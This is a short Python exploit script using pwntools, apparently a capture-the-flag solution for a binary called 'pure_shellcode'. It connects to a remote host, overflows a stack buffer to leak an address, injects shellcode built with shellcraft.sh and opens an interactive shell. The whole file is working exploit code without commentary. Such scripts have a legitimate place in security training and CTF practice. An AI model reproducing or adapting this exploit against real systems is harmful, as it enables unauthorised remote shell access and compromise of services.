from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# p = process('./pure_shellcode')
p = remote('141.85.224.106', 31340)
elf = ELF('./pure_shellcode')

p.send(b'a' * 0x48 + p64(elf.symbols['main']))

resp = p.recv(0x80)
leak = u64(resp[0x50:0x58])
buff_addr = leak - 0x50

sc = asm('sub rsp, 1000\n' + shellcraft.sh())
payload = sc + b'a' * (0x48 - len(sc)) + p64(buff_addr)
p.sendline(payload)

p.recv(0x80)
p.interactive()
